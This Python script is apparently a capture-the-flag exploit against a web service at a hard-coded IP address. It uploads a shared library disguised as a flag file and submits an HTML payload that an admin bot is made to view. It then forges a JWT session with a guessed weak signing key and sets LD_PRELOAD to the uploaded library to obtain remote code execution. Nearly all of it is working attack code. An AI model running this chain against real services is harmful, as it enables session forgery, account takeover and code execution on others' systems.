import requests
import jwt
import random

import requests.cookies

ENDPOINT = "http://34.59.119.124:17005"

bad_key = "meowmeowmeowmeow"
algorithm = "HS256"

PASSWORD = "meow"

def make_username():
    return "meow"+str(random.randint(0,999999))

def extract_session(jar: requests.cookies.RequestsCookieJar):
    sess = jar.get("session")
    payload = jwt.decode(sess, options={"verify_signature": False})
    return payload

def register_account(username, displayname="meow", curr_cookie=None, flag_file="flag", return_cookie=False):
    files = {
        'flag': open(flag_file, "rb"),
    }
    data = {
        'username': username,
        'password': PASSWORD,
        'display_name': displayname
    }
    headers = None
    if curr_cookie is not None:
        headers = {'cookie': f'session={curr_cookie}'}
    s = requests.Session()
    s.post(ENDPOINT+"/register", files=files, data=data, headers=headers)
    payload = extract_session(s.cookies)
    if return_cookie:
        return s.cookies
    return payload['user_id']

def login(username: str, session: requests.Session):
    data = {
        'username': username,
        'password': PASSWORD,
    }
    r = session.post(ENDPOINT+"/login", data=data)
    return r

def get_profile(session: requests.Session):
    r = session.get(ENDPOINT+"/api/profile")
    return r.json()

def guess_flag(user: str, flag: bytes, session: requests.Session):
    try:
        r = session.post(ENDPOINT+f"/api/users/{user}/checkflag", data={"flag": flag})
        return r
    except Exception as e:
        print(e)
        return None
    
def list_guesses(user: str,  session: requests.Session):
    r = session.get(ENDPOINT+f"/api/users/{user}/guesses")
    return r.json()

def get_guess(user: str, guess: str, session: requests.Session):
    r = session.get(ENDPOINT+f"/api/users/{user}/guesses/{guess}")
    return r.content

def set_profile(desc: str, session: requests.Session):
    r = session.post(ENDPOINT+"/api/profile", json={"description": desc})
    return r.content

def report_user(url: str, session: requests.Session):
    r = session.post(ENDPOINT+"/api/report", json={'url': url})
    return r.json()

def get_cert(session: requests.Session):
    r = session.get(ENDPOINT+"/api/certificate")
    return r

def find_admin_displayname():
    s = requests.Session()
    acct_1_id = register_account(make_username(), flag_file="meow.txt.coll")
    print(acct_1_id)
    acct_2_username = make_username()
    acct_2_id = register_account(acct_2_username, flag_file="libmeow.so")
    print(acct_2_id, acct_2_username)
    r = login(acct_2_username, s)
    print("login:", r.status_code)
    r = guess_flag(acct_1_id, open("payload.html.coll", 'rb').read(), s)
    if r is not None:
        print("flag guess:", r.json())
    guesses = list_guesses(acct_2_id, s)['guesses']
    guess_id = guesses[0]['guess_id']
    print("guess id:", guess_id)
    r = report_user(f'/api/users/{acct_2_id}/guesses/{guess_id}',s)
    print(r)

def rce(payload_user: str, admin_username: str, admin_displayname: str):
    s = requests.Session()
    payload = {
        "username": "woof",
        'user_kind': 1,
        'user_id': payload_user,
        'properties': {
            'display_name': 'mreow1',
            'description': 'lol, lmao',
            'LD_PRELOAD': f'./userdata/{payload_user}/flag.txt'
        },
        'logged_in': True
    }
    sess = jwt.encode(payload, bad_key, algorithm="HS256")
    cookies = register_account(admin_username, admin_displayname, curr_cookie=sess, flag_file="meow.txt.coll", return_cookie=True)
    s.cookies = cookies
    r = get_cert(s)
    print(r)

# find_admin_displayname()
rce("00cbd366-f054-40e2-ac04-f496e91b7934", "admin-ee836e05-a604-428a-a708-11fd231b3ae7", "379d1248-658e-4766-a3df-2cb45b83ec52")



